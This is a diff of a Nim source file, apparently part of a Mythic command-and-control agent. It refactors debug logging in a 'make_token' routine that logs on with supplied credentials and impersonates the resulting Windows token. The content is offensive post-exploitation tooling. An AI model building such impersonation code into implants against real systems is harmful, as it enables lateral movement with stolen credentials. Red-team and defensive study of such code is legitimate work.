@@ -1,8 +1,6 @@
-## Make Token - Creates a new logon session and applies it to the agent
-
 import std/[json, strformat]
-import ../config
 import ../utils/mythic_responses
+import ../utils/debug
 import token_manager
 
 when defined(windows):
@@ -10,8 +8,6 @@ when defined(windows):
   
   proc makeToken*(taskId: string, params: JsonNode): JsonNode =
     ## Create a new logon token and impersonate it
-    let cfg = getConfig()
-    
     try:
       # Parse parameters
       let credential = params["credential"]
@@ -27,8 +23,7 @@ when defined(windows):
       if password.len == 0:
         return mythicError(taskId, "Password cannot be empty")
       
-      if cfg.debug:
-        echo &"[DEBUG] make_token: user={domain}\\{username}, netOnly={netOnly}"
+      debug &"[DEBUG] make_token: user={domain}\\{username}, netOnly={netOnly}"
       
       # Convert strings to wide strings
       let usernameW = +$username
@@ -65,8 +60,7 @@ when defined(windows):
       # Get the new user context (after impersonation)
       let newUser = getCurrentUsername()
       
-      if cfg.debug:
-        echo &"[DEBUG] Successfully impersonated: {newUser}"
+      debug &"[DEBUG] Successfully impersonated: {newUser}"
       
       # Build response with callback data
       return mythicCallback(taskId, &"Successfully impersonated {newUser}", %*{
